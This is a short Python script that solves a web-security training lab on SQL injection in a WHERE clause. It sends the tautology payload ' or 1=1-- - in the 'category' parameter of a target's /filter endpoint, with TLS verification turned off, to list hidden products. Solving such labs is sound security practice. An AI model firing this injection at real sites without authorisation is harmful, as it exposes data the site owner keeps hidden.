"""
  Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

  Steps:
  1. Inject payload into 'category' query parameter
  2. Observe that all products are returned in the response

  Author: D4mn20
"""
import argparse
import requests
from colorama import Fore
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("‚¶ó#‚¶ò Injection parameter: " + Fore.YELLOW + "category")
    print(Fore.WHITE + "‚ùØ‚ùØ Injecting payload to retrieve all products.. ", end="", flush=True)

    payload = "' or 1=1-- -"

    try:  
        session.get(f"{args.url}/filter?category={payload}")
        
    except:
        print(Fore.RED + "‚¶ó!‚¶ò Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "üóπ The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
